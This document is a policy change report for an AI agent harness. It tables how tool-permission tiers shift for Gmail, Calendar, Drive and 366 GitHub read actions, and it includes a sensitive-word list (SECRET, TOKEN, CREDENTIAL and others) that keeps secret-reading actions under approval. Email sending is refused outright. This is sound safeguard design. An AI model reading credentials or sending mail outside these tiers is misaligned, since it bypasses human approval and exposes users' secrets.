# 007 policy tool names: effective tier changes

Computed, not estimated: every tool below was classified by the OLD rules with the OLD matching (`2ce8310` = main before 007 (#61), `backend/app/policy/default_rules.yaml`, raw `fnmatchcase`, no rule = Tier 3) and by the NEW rules with the NEW matching (`omniharness.tools.names.canonical_tool_name` on both sides, no rule = refused), for every argument scenario any exception in either file names.

Tool list (1101 tools): every tool the shipped MCP servers expose (`backend/tests/policy/real_tool_names.py`, read from each server's package), every built-in, and every action the installed composio-core 0.7.21 SDK lists for the four Composio toolkits connected on the live stack (GMAIL, GITHUB, GOOGLECALENDAR, GOOGLEDRIVE). Composio actions newer than that list have no rule and are refused.

620 tools keep the tier they had through the old no-rule default (Tier 3), now by an explicit rule; they are not listed.

## Every change except the GitHub connector reads

| Tool | Arguments | Before | After | Direction |
|---|---|---|---|---|
| `connector-gmail_GMAIL_ADD_LABEL_TO_EMAIL` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-gmail_GMAIL_CREATE_LABEL` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-gmail_GMAIL_GET_CONTACTS` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-gmail_GMAIL_GET_PEOPLE` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-gmail_GMAIL_MODIFY_THREAD_LABELS` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-gmail_GMAIL_SEARCH_PEOPLE` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-googlecalendar_GOOGLECALENDAR_DUPLICATE_CALENDAR` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_COPY_FILE` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_CREATE_FILE_FROM_TEXT` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_CREATE_FOLDER` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_DOWNLOAD_FILE` | any | T3 (no rule: default) | T2 | **LESS STRICT** (Tier 2, not 1: no local evidence that it returns content without writing a file) |
| `connector-googledrive_GOOGLEDRIVE_FIND_FILE` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_FIND_FOLDER` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_PARSE_FILE` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `connector-googledrive_GOOGLEDRIVE_UPLOAD_FILE` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `gmail_draft_email` | any | T3 (no rule: default) | T2 | **LESS STRICT** |
| `googlecalendar_create-event` | no `sendUpdates`, or `sendUpdates=none` | T3 (no rule: default) | T2 | **LESS STRICT** (the intended rule now matches) |
| `googlecalendar_create-event` | `sendUpdates=all` or `externalOnly` (also `send_updates=`) | T3 (no rule: default) | T3 | unchanged: the exception now tests the server's real argument, `sendUpdates`; a name-only fix would have made this T2 |
| `googlecalendar_search-events` | any | T3 (no rule: default) | T1 | **LESS STRICT** |
| `gmail_get_or_create_label` | any | T1 | T2 | stricter: **a write that was less strict than intended** (`gmail_get*` matched it) |
| `connector-gmail_GMAIL_REPLY_TO_THREAD` | any | T3 (no rule: default) | REFUSED (no rule) | stricter: REFUSED |
| `connector-gmail_GMAIL_SEND_EMAIL` | any | T3 (no rule: default) | REFUSED (no rule) | stricter: REFUSED (email is read-and-draft only, FR-012) |
| `gmail_send_email` | any | T3 (no rule: default) | REFUSED (no rule) | stricter: REFUSED |

## GitHub connector reads: T3 (no rule: default) -> T1, **LESS STRICT** (366 actions)

Tool name `connector-github_<ACTION>`. First word GET, LIST, SEARCH, FETCH or FIND, and the name contains none of SECRET, KEY, TOKEN, CREDENTIAL, WEBHOOK, ADMIN, PERMISSION, VARIABLE (the list lives in `backend/tests/policy/github_connector_policy.py`, which generates these rules). The 74 reads whose names do contain one stay Tier 3 (unchanged, now by an explicit rule), as do all 512 other GitHub actions.

<details><summary>All 366 actions</summary>

- `GITHUB_FIND_CONFLICTING_PACKAGES_FOR_DOCKER_MIGRATION`
- `GITHUB_GET_ACCESS_RESTRICTIONS`
- `GITHUB_GET_ALLOWED_ACTIONS_AND_REUSABLE_WORKFLOWS_FOR_AN_ORGANIZATION`
- `GITHUB_GET_ALLOWED_ACTIONS_AND_REUSABLE_WORKFLOWS_FOR_A_REPOSITORY`
- `GITHUB_GET_ALL_API_VERSIONS`
- `GITHUB_GET_ALL_AUTOLINKS_OF_A_REPOSITORY`
- `GITHUB_GET_ALL_CODES_OF_CONDUCT`
- `GITHUB_GET_ALL_COMMONLY_USED_LICENSES`
- `GITHUB_GET_ALL_CONTRIBUTOR_COMMIT_ACTIVITY`
- `GITHUB_GET_ALL_CUSTOM_PROPERTIES_FOR_AN_ORGANIZATION`
- `GITHUB_GET_ALL_CUSTOM_PROPERTY_VALUES_FOR_A_REPOSITORY`
- `GITHUB_GET_ALL_DEPLOYMENT_PROTECTION_RULES_FOR_AN_ENVIRONMENT`
- `GITHUB_GET_ALL_GITIGNORE_TEMPLATES`
- `GITHUB_GET_ALL_ORGANIZATION_REPOSITORY_RULESETS`
- `GITHUB_GET_ALL_ORGANIZATION_ROLES_FOR_AN_ORGANIZATION`
- `GITHUB_GET_ALL_REPOSITORY_RULESETS`
- `GITHUB_GET_ALL_REPOSITORY_TOPICS`
- `GITHUB_GET_ALL_REQUESTED_REVIEWERS_FOR_A_PULL_REQUEST`
- `GITHUB_GET_ALL_STATUS_CHECK_CONTEXTS`
- `GITHUB_GET_AN_APP`
- `GITHUB_GET_AN_ARTIFACT`
- `GITHUB_GET_AN_ASSIGNMENT`
- `GITHUB_GET_AN_AUTOLINK_REFERENCE_OF_A_REPOSITORY`
- `GITHUB_GET_AN_ENVIRONMENT`
- `GITHUB_GET_AN_IMPORT_STATUS`
- `GITHUB_GET_AN_ISSUE`
- `GITHUB_GET_AN_ISSUE_COMMENT`
- `GITHUB_GET_AN_ISSUE_EVENT`
- `GITHUB_GET_AN_ORGANIZATION`
- `GITHUB_GET_AN_ORGANIZATION_MEMBERSHIP_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_AN_ORGANIZATION_MIGRATION_STATUS`
- `GITHUB_GET_AN_ORGANIZATION_REPOSITORY_RULESET`
- `GITHUB_GET_AN_ORGANIZATION_ROLE`
- `GITHUB_GET_AN_ORGANIZATION_RULE_SUITE`
- `GITHUB_GET_APPS_WITH_ACCESS_TO_THE_PROTECTED_BRANCH`
- `GITHUB_GET_ASSIGNMENT_GRADES`
- `GITHUB_GET_A_BLOB`
- `GITHUB_GET_A_BRANCH`
- `GITHUB_GET_A_CHECK_RUN`
- `GITHUB_GET_A_CHECK_SUITE`
- `GITHUB_GET_A_CLASSROOM`
- `GITHUB_GET_A_CODESPACE_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_A_CODE_OF_CONDUCT`
- `GITHUB_GET_A_CODE_QL_DATABASE_FOR_A_REPOSITORY`
- `GITHUB_GET_A_CODE_SCANNING_ALERT`
- `GITHUB_GET_A_CODE_SCANNING_ANALYSIS_FOR_A_REPOSITORY`
- `GITHUB_GET_A_CODE_SCANNING_DEFAULT_SETUP_CONFIGURATION`
- `GITHUB_GET_A_COMMIT`
- `GITHUB_GET_A_COMMIT_COMMENT`
- `GITHUB_GET_A_COMMIT_OBJECT`
- `GITHUB_GET_A_CUSTOM_DEPLOYMENT_PROTECTION_RULE`
- `GITHUB_GET_A_CUSTOM_PROPERTY_FOR_AN_ORGANIZATION`
- `GITHUB_GET_A_DEPENDABOT_ALERT`
- `GITHUB_GET_A_DEPLOYMENT`
- `GITHUB_GET_A_DEPLOYMENT_BRANCH_POLICY`
- `GITHUB_GET_A_DEPLOYMENT_STATUS`
- `GITHUB_GET_A_DIFF_OF_THE_DEPENDENCIES_BETWEEN_COMMITS`
- `GITHUB_GET_A_DISCUSSION`
- `GITHUB_GET_A_DISCUSSION_COMMENT`
- `GITHUB_GET_A_DISCUSSION_COMMENT_LEGACY`
- `GITHUB_GET_A_DISCUSSION_LEGACY`
- `GITHUB_GET_A_DNS_HEALTH_CHECK_FOR_GITHUB_PAGES`
- `GITHUB_GET_A_GIST`
- `GITHUB_GET_A_GIST_COMMENT`
- `GITHUB_GET_A_GIST_REVISION`
- `GITHUB_GET_A_GITHUB_PAGES_SITE`
- `GITHUB_GET_A_GITIGNORE_TEMPLATE`
- `GITHUB_GET_A_GLOBAL_SECURITY_ADVISORY`
- `GITHUB_GET_A_JOB_FOR_A_WORKFLOW_RUN`
- `GITHUB_GET_A_LABEL`
- `GITHUB_GET_A_LICENSE`
- `GITHUB_GET_A_MILESTONE`
- `GITHUB_GET_A_PACKAGE_FOR_AN_ORGANIZATION`
- `GITHUB_GET_A_PACKAGE_FOR_A_USER`
- `GITHUB_GET_A_PACKAGE_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_A_PACKAGE_VERSION_FOR_AN_ORGANIZATION`
- `GITHUB_GET_A_PACKAGE_VERSION_FOR_A_USER`
- `GITHUB_GET_A_PACKAGE_VERSION_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_A_PROJECT`
- `GITHUB_GET_A_PROJECT_CARD`
- `GITHUB_GET_A_PROJECT_COLUMN`
- `GITHUB_GET_A_PULL_REQUEST`
- `GITHUB_GET_A_REFERENCE`
- `GITHUB_GET_A_RELEASE`
- `GITHUB_GET_A_RELEASE_ASSET`
- `GITHUB_GET_A_RELEASE_BY_TAG_NAME`
- `GITHUB_GET_A_REPOSITORY`
- `GITHUB_GET_A_REPOSITORY_README`
- `GITHUB_GET_A_REPOSITORY_README_FOR_A_DIRECTORY`
- `GITHUB_GET_A_REPOSITORY_RULESET`
- `GITHUB_GET_A_REPOSITORY_RULE_SUITE`
- `GITHUB_GET_A_REPOSITORY_SECURITY_ADVISORY`
- `GITHUB_GET_A_REPOSITORY_SUBSCRIPTION`
- `GITHUB_GET_A_REVIEW_COMMENT_FOR_A_PULL_REQUEST`
- `GITHUB_GET_A_REVIEW_FOR_A_PULL_REQUEST`
- `GITHUB_GET_A_SELF_HOSTED_RUNNER_FOR_AN_ORGANIZATION`
- `GITHUB_GET_A_SELF_HOSTED_RUNNER_FOR_A_REPOSITORY`
- `GITHUB_GET_A_TAG`
- `GITHUB_GET_A_TEAM_BY_NAME`
- `GITHUB_GET_A_TEAM_LEGACY`
- `GITHUB_GET_A_THREAD`
- `GITHUB_GET_A_THREAD_SUBSCRIPTION_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_A_TREE`
- `GITHUB_GET_A_USER`
- `GITHUB_GET_A_USER_MIGRATION_STATUS`
- `GITHUB_GET_A_WORKFLOW`
- `GITHUB_GET_A_WORKFLOW_RUN`
- `GITHUB_GET_A_WORKFLOW_RUN_ATTEMPT`
- `GITHUB_GET_BRANCH_PROTECTION`
- `GITHUB_GET_COMMIT_AUTHORS`
- `GITHUB_GET_COMMIT_SIGNATURE_PROTECTION`
- `GITHUB_GET_COMMUNITY_PROFILE_METRICS`
- `GITHUB_GET_CONTEXTUAL_INFORMATION_FOR_A_USER`
- `GITHUB_GET_COPILOT_SEAT_ASSIGNMENT_DETAILS_FOR_A_USER`
- `GITHUB_GET_COPILOT_SEAT_INFORMATION_AND_SETTINGS_FOR_AN_ORGANIZATION`
- `GITHUB_GET_DEFAULT_ATTRIBUTES_FOR_A_CODESPACE`
- `GITHUB_GET_DETAILS_ABOUT_A_CODESPACE_EXPORT`
- `GITHUB_GET_EMOJIS`
- `GITHUB_GET_FEEDS`
- `GITHUB_GET_GITHUB_ACTIONS_BILLING_FOR_AN_ORGANIZATION`
- `GITHUB_GET_GITHUB_ACTIONS_BILLING_FOR_A_USER`
- `GITHUB_GET_GITHUB_ACTIONS_CACHE_USAGE_FOR_AN_ORGANIZATION`
- `GITHUB_GET_GITHUB_ACTIONS_CACHE_USAGE_FOR_A_REPOSITORY`
- `GITHUB_GET_GITHUB_META_INFORMATION`
- `GITHUB_GET_GITHUB_PACKAGES_BILLING_FOR_AN_ORGANIZATION`
- `GITHUB_GET_GITHUB_PACKAGES_BILLING_FOR_A_USER`
- `GITHUB_GET_GITHUB_PAGES_BUILD`
- `GITHUB_GET_INFORMATION_ABOUT_A_SARIF_UPLOAD`
- `GITHUB_GET_INTERACTION_RESTRICTIONS_FOR_AN_ORGANIZATION`
- `GITHUB_GET_INTERACTION_RESTRICTIONS_FOR_A_REPOSITORY`
- `GITHUB_GET_INTERACTION_RESTRICTIONS_FOR_YOUR_PUBLIC_REPOSITORIES`
- `GITHUB_GET_LARGE_FILES`
- `GITHUB_GET_LATEST_PAGES_BUILD`
- `GITHUB_GET_OCTOCAT`
- `GITHUB_GET_ORGANIZATION_MEMBERSHIP_FOR_A_USER`
- `GITHUB_GET_PAGE_VIEWS`
- `GITHUB_GET_PENDING_DEPLOYMENTS_FOR_A_WORKFLOW_RUN`
- `GITHUB_GET_PULL_REQUEST_REVIEW_PROTECTION`
- `GITHUB_GET_RATE_LIMIT_STATUS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_GET_REPOSITORY_CLONES`
- `GITHUB_GET_REPOSITORY_CONTENT`
- `GITHUB_GET_RULES_FOR_A_BRANCH`
- `GITHUB_GET_SHARED_STORAGE_BILLING_FOR_AN_ORGANIZATION`
- `GITHUB_GET_SHARED_STORAGE_BILLING_FOR_A_USER`
- `GITHUB_GET_STATUS_CHECKS_PROTECTION`
- `GITHUB_GET_TEAMS_WITH_ACCESS_TO_THE_PROTECTED_BRANCH`
- `GITHUB_GET_TEAM_MEMBERSHIP_FOR_A_USER`
- `GITHUB_GET_TEAM_MEMBERSHIP_FOR_A_USER_LEGACY`
- `GITHUB_GET_TEAM_MEMBER_LEGACY`
- `GITHUB_GET_THE_AUTHENTICATED_USER`
- `GITHUB_GET_THE_COMBINED_STATUS_FOR_A_SPECIFIC_REFERENCE`
- `GITHUB_GET_THE_HOURLY_COMMIT_COUNT_FOR_EACH_DAY`
- `GITHUB_GET_THE_LAST_YEAR_OF_COMMIT_ACTIVITY`
- `GITHUB_GET_THE_LATEST_RELEASE`
- `GITHUB_GET_THE_LEVEL_OF_ACCESS_FOR_WORKFLOWS_OUTSIDE_OF_THE_REPOSITORY`
- `GITHUB_GET_THE_LICENSE_FOR_A_REPOSITORY`
- `GITHUB_GET_THE_REVIEW_HISTORY_FOR_A_WORKFLOW_RUN`
- `GITHUB_GET_THE_STATUS_OF_A_GITHUB_PAGES_DEPLOYMENT`
- `GITHUB_GET_THE_WEEKLY_COMMIT_ACTIVITY`
- `GITHUB_GET_THE_WEEKLY_COMMIT_COUNT`
- `GITHUB_GET_THE_ZEN_OF_GITHUB`
- `GITHUB_GET_TOP_REFERRAL_PATHS`
- `GITHUB_GET_TOP_REFERRAL_SOURCES`
- `GITHUB_GET_USERS_WITH_ACCESS_TO_THE_PROTECTED_BRANCH`
- `GITHUB_GET_WORKFLOW_RUN_USAGE`
- `GITHUB_GET_WORKFLOW_USAGE`
- `GITHUB_LIST_ACCEPTED_ASSIGNMENTS_FOR_AN_ASSIGNMENT`
- `GITHUB_LIST_ALL_COPILOT_SEAT_ASSIGNMENTS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_APP_INSTALLATIONS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_ARTIFACTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_ASSIGNEES`
- `GITHUB_LIST_ASSIGNMENTS_FOR_A_CLASSROOM`
- `GITHUB_LIST_AVAILABLE_MACHINE_TYPES_FOR_A_REPOSITORY`
- `GITHUB_LIST_BRANCHES`
- `GITHUB_LIST_BRANCHES_FOR_HEAD_COMMIT`
- `GITHUB_LIST_CHECK_RUNS_FOR_A_GIT_REFERENCE`
- `GITHUB_LIST_CHECK_RUNS_IN_A_CHECK_SUITE`
- `GITHUB_LIST_CHECK_RUN_ANNOTATIONS`
- `GITHUB_LIST_CHECK_SUITES_FOR_A_GIT_REFERENCE`
- `GITHUB_LIST_CHILD_TEAMS`
- `GITHUB_LIST_CHILD_TEAMS_LEGACY`
- `GITHUB_LIST_CLASSROOMS`
- `GITHUB_LIST_CODEOWNERS_ERRORS`
- `GITHUB_LIST_CODESPACES_FOR_A_USER_IN_ORGANIZATION`
- `GITHUB_LIST_CODESPACES_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_CODESPACES_FOR_THE_ORGANIZATION`
- `GITHUB_LIST_CODESPACES_IN_A_REPOSITORY_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_CODE_QL_DATABASES_FOR_A_REPOSITORY`
- `GITHUB_LIST_CODE_SCANNING_ALERTS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_CODE_SCANNING_ALERTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_CODE_SCANNING_ANALYSES_FOR_A_REPOSITORY`
- `GITHUB_LIST_COMMENTS_FOR_A_PULL_REQUEST_REVIEW`
- `GITHUB_LIST_COMMITS`
- `GITHUB_LIST_COMMITS_ON_A_PULL_REQUEST`
- `GITHUB_LIST_COMMIT_COMMENTS`
- `GITHUB_LIST_COMMIT_COMMENTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_COMMIT_STATUSES_FOR_A_REFERENCE`
- `GITHUB_LIST_CUSTOM_PROPERTY_VALUES_FOR_ORGANIZATION_REPOSITORIES`
- `GITHUB_LIST_DEPENDABOT_ALERTS_FOR_AN_ENTERPRISE`
- `GITHUB_LIST_DEPENDABOT_ALERTS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_DEPENDABOT_ALERTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_DEPLOYMENTS`
- `GITHUB_LIST_DEPLOYMENT_BRANCH_POLICIES`
- `GITHUB_LIST_DEPLOYMENT_STATUSES`
- `GITHUB_LIST_DISCUSSIONS`
- `GITHUB_LIST_DISCUSSIONS_LEGACY`
- `GITHUB_LIST_DISCUSSION_COMMENTS`
- `GITHUB_LIST_DISCUSSION_COMMENTS_LEGACY`
- `GITHUB_LIST_DOCKER_MIGRATION_CONFLICTS`
- `GITHUB_LIST_EMAIL_ADDRESSES_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ENVIRONMENTS`
- `GITHUB_LIST_ENVIRONMENT_CUSTOM_DEPLOYMENT_RULES`
- `GITHUB_LIST_EVENTS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_EVENTS_RECEIVED_BY_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_FAILED_ORGANIZATION_INVITATIONS`
- `GITHUB_LIST_FOLLOWERS_OF_A_USER`
- `GITHUB_LIST_FOLLOWERS_OF_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_FORKS`
- `GITHUB_LIST_GISTS_FOR_A_USER`
- `GITHUB_LIST_GISTS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_GIST_COMMENTS`
- `GITHUB_LIST_GIST_COMMITS`
- `GITHUB_LIST_GIST_FORKS`
- `GITHUB_LIST_GITHUB_ACTIONS_CACHES_FOR_A_REPOSITORY`
- `GITHUB_LIST_GITHUB_PAGES_BUILDS`
- `GITHUB_LIST_GLOBAL_SECURITY_ADVISORIES`
- `GITHUB_LIST_INSTALLATION_REQUESTS_FOR_THE_AUTHENTICATED_APP`
- `GITHUB_LIST_INSTANCES_OF_A_CODE_SCANNING_ALERT`
- `GITHUB_LIST_ISSUES_ASSIGNED_TO_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ISSUE_COMMENTS`
- `GITHUB_LIST_ISSUE_COMMENTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_ISSUE_EVENTS`
- `GITHUB_LIST_ISSUE_EVENTS_FOR_A_REPOSITORY`
- `GITHUB_LIST_JOBS_FOR_A_WORKFLOW_RUN`
- `GITHUB_LIST_JOBS_FOR_A_WORKFLOW_RUN_ATTEMPT`
- `GITHUB_LIST_LABELS_FOR_AN_ISSUE`
- `GITHUB_LIST_LABELS_FOR_A_REPOSITORY`
- `GITHUB_LIST_LABELS_FOR_A_SELF_HOSTED_RUNNER_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_LABELS_FOR_A_SELF_HOSTED_RUNNER_FOR_A_REPOSITORY`
- `GITHUB_LIST_LABELS_FOR_ISSUES_IN_A_MILESTONE`
- `GITHUB_LIST_MACHINE_TYPES_FOR_A_CODESPACE`
- `GITHUB_LIST_MATCHING_REFERENCES`
- `GITHUB_LIST_MILESTONES`
- `GITHUB_LIST_NOTIFICATIONS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ORGANIZATIONS`
- `GITHUB_LIST_ORGANIZATIONS_FOR_A_USER`
- `GITHUB_LIST_ORGANIZATIONS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ORGANIZATION_EVENTS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ORGANIZATION_INVITATION_TEAMS`
- `GITHUB_LIST_ORGANIZATION_ISSUES_ASSIGNED_TO_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ORGANIZATION_MEMBERS`
- `GITHUB_LIST_ORGANIZATION_MEMBERSHIPS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_ORGANIZATION_MIGRATIONS`
- `GITHUB_LIST_ORGANIZATION_PROJECTS`
- `GITHUB_LIST_ORGANIZATION_REPOSITORIES`
- `GITHUB_LIST_ORGANIZATION_RULE_SUITES`
- `GITHUB_LIST_ORG_REPOS_WITHGITHUB_ACTIONS_ENABLED`
- `GITHUB_LIST_OUTSIDE_COLLABORATORS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_OWNED_PACKAGE_VERSIONS`
- `GITHUB_LIST_PACKAGES_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_PACKAGES_FOR_A_USER`
- `GITHUB_LIST_PACKAGES_FOR_THE_AUTHENTICATED_USER_S_NAMESPACE`
- `GITHUB_LIST_PACKAGE_VERSIONS_FOR_A_PACKAGE_OWNED_BY_AN_ORGANIZATION`
- `GITHUB_LIST_PACKAGE_VERSIONS_FOR_A_PACKAGE_OWNED_BY_A_USER`
- `GITHUB_LIST_PENDING_ORGANIZATION_INVITATIONS`
- `GITHUB_LIST_PENDING_TEAM_INVITATIONS`
- `GITHUB_LIST_PENDING_TEAM_INVITATIONS_LEGACY`
- `GITHUB_LIST_PROJECT_CARDS`
- `GITHUB_LIST_PROJECT_COLLABORATORS`
- `GITHUB_LIST_PROJECT_COLUMNS`
- `GITHUB_LIST_PUBLIC_EMAIL_ADDRESSES_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_PUBLIC_EVENTS`
- `GITHUB_LIST_PUBLIC_EVENTS_FOR_A_NETWORK_OF_REPOSITORIES`
- `GITHUB_LIST_PUBLIC_EVENTS_FOR_A_USER`
- `GITHUB_LIST_PUBLIC_EVENTS_RECEIVED_BY_A_USER`
- `GITHUB_LIST_PUBLIC_GISTS`
- `GITHUB_LIST_PUBLIC_ORGANIZATION_EVENTS`
- `GITHUB_LIST_PUBLIC_ORGANIZATION_MEMBERS`
- `GITHUB_LIST_PUBLIC_REPOSITORIES`
- `GITHUB_LIST_PULL_REQUESTS`
- `GITHUB_LIST_PULL_REQUESTS_ASSOCIATED_WITH_A_COMMIT`
- `GITHUB_LIST_PULL_REQUESTS_FILES`
- `GITHUB_LIST_REACTIONS_FOR_AN_ISSUE`
- `GITHUB_LIST_REACTIONS_FOR_AN_ISSUE_COMMENT`
- `GITHUB_LIST_REACTIONS_FOR_A_COMMIT_COMMENT`
- `GITHUB_LIST_REACTIONS_FOR_A_PULL_REQUEST_REVIEW_COMMENT`
- `GITHUB_LIST_REACTIONS_FOR_A_RELEASE`
- `GITHUB_LIST_REACTIONS_FOR_A_TEAM_DISCUSSION`
- `GITHUB_LIST_REACTIONS_FOR_A_TEAM_DISCUSSION_COMMENT`
- `GITHUB_LIST_REACTIONS_FOR_A_TEAM_DISCUSSION_COMMENT_LEGACY`
- `GITHUB_LIST_REACTIONS_FOR_A_TEAM_DISCUSSION_LEGACY`
- `GITHUB_LIST_RELEASES`
- `GITHUB_LIST_RELEASE_ASSETS`
- `GITHUB_LIST_REPOSITORIES_ACCESSIBLE_TO_THE_APP_INSTALLATION`
- `GITHUB_LIST_REPOSITORIES_FOR_A_USER`
- `GITHUB_LIST_REPOSITORIES_FOR_A_USER_MIGRATION`
- `GITHUB_LIST_REPOSITORIES_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_REPOSITORIES_IN_AN_ORGANIZATION_MIGRATION`
- `GITHUB_LIST_REPOSITORIES_STARRED_BY_A_USER`
- `GITHUB_LIST_REPOSITORIES_STARRED_BY_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_REPOSITORIES_WATCHED_BY_A_USER`
- `GITHUB_LIST_REPOSITORIES_WATCHED_BY_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_REPOSITORY_ACTIVITIES`
- `GITHUB_LIST_REPOSITORY_COLLABORATORS`
- `GITHUB_LIST_REPOSITORY_CONTRIBUTORS`
- `GITHUB_LIST_REPOSITORY_EVENTS`
- `GITHUB_LIST_REPOSITORY_INVITATIONS`
- `GITHUB_LIST_REPOSITORY_INVITATIONS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_REPOSITORY_ISSUES`
- `GITHUB_LIST_REPOSITORY_LANGUAGES`
- `GITHUB_LIST_REPOSITORY_NOTIFICATIONS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_REPOSITORY_PROJECTS`
- `GITHUB_LIST_REPOSITORY_RULE_SUITES`
- `GITHUB_LIST_REPOSITORY_SECURITY_ADVISORIES`
- `GITHUB_LIST_REPOSITORY_SECURITY_ADVISORIES_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_REPOSITORY_TAGS`
- `GITHUB_LIST_REPOSITORY_TEAMS`
- `GITHUB_LIST_REPOSITORY_WORKFLOWS`
- `GITHUB_LIST_REPOS_WITH_GHACTIONS_CACHE_USAGE`
- `GITHUB_LIST_REPO_DEV_CONTAINER_CONFIGS_FOR_USER`
- `GITHUB_LIST_REVIEWS_FOR_A_PULL_REQUEST`
- `GITHUB_LIST_REVIEW_COMMENTS_IN_A_REPOSITORY`
- `GITHUB_LIST_REVIEW_COMMENTS_ON_A_PULL_REQUEST`
- `GITHUB_LIST_RUNNER_APPLICATIONS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_RUNNER_APPLICATIONS_FOR_A_REPOSITORY`
- `GITHUB_LIST_SECURITY_MANAGER_TEAMS`
- `GITHUB_LIST_SELF_HOSTED_RUNNERS_FOR_AN_ORGANIZATION`
- `GITHUB_LIST_SELF_HOSTED_RUNNERS_FOR_A_REPOSITORY`
- `GITHUB_LIST_SOCIAL_ACCOUNTS_FOR_A_USER`
- `GITHUB_LIST_SOCIAL_ACCOUNTS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_STARGAZERS`
- `GITHUB_LIST_STARRED_GISTS`
- `GITHUB_LIST_SUBSCRIPTIONS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_SUBSCRIPTIONS_FOR_THE_AUTHENTICATED_USER_STUBBED`
- `GITHUB_LIST_TAG_PROTECTION_STATES_FOR_A_REPOSITORY`
- `GITHUB_LIST_TEAMS`
- `GITHUB_LIST_TEAMS_FOR_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_TEAMS_THAT_ARE_ASSIGNED_TO_AN_ORGANIZATION_ROLE`
- `GITHUB_LIST_TEAM_MEMBERS`
- `GITHUB_LIST_TEAM_MEMBERS_LEGACY`
- `GITHUB_LIST_TEAM_PROJECTS`
- `GITHUB_LIST_TEAM_PROJECTS_LEGACY`
- `GITHUB_LIST_TEAM_REPOSITORIES`
- `GITHUB_LIST_TEAM_REPOSITORIES_LEGACY`
- `GITHUB_LIST_THE_PEOPLE_A_USER_FOLLOWS`
- `GITHUB_LIST_THE_PEOPLE_THE_AUTHENTICATED_USER_FOLLOWS`
- `GITHUB_LIST_TIMELINE_EVENTS_FOR_AN_ISSUE`
- `GITHUB_LIST_USERS`
- `GITHUB_LIST_USERS_BLOCKED_BY_AN_ORGANIZATION`
- `GITHUB_LIST_USERS_BLOCKED_BY_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_USERS_THAT_ARE_ASSIGNED_TO_AN_ORGANIZATION_ROLE`
- `GITHUB_LIST_USER_ACCOUNT_ISSUES_ASSIGNED_TO_THE_AUTHENTICATED_USER`
- `GITHUB_LIST_USER_MIGRATIONS`
- `GITHUB_LIST_USER_PROJECTS`
- `GITHUB_LIST_WATCHERS`
- `GITHUB_LIST_WORKFLOW_RUNS_FOR_A_REPOSITORY`
- `GITHUB_LIST_WORKFLOW_RUNS_FOR_A_WORKFLOW`
- `GITHUB_LIST_WORKFLOW_RUN_ARTIFACTS`
- `GITHUB_SEARCH_CODE`
- `GITHUB_SEARCH_COMMITS`
- `GITHUB_SEARCH_ISSUES_AND_PULL_REQUESTS`
- `GITHUB_SEARCH_LABELS`
- `GITHUB_SEARCH_REPOSITORIES`
- `GITHUB_SEARCH_REPO_S`
- `GITHUB_SEARCH_TOPICS`
- `GITHUB_SEARCH_USERS`

</details>

## Follow-up delta: VARIABLE added to the sensitive words (vs the merged 007, `95ab37b`)

Actions variables are plaintext and often hold configuration values. Already included in the tables above; this is what the follow-up alone changed:

| Tool | Merged 007 | Now |
|---|---|---|
| `connector-github_GITHUB_GET_AN_ENVIRONMENT_VARIABLE` | T1 | T3 |
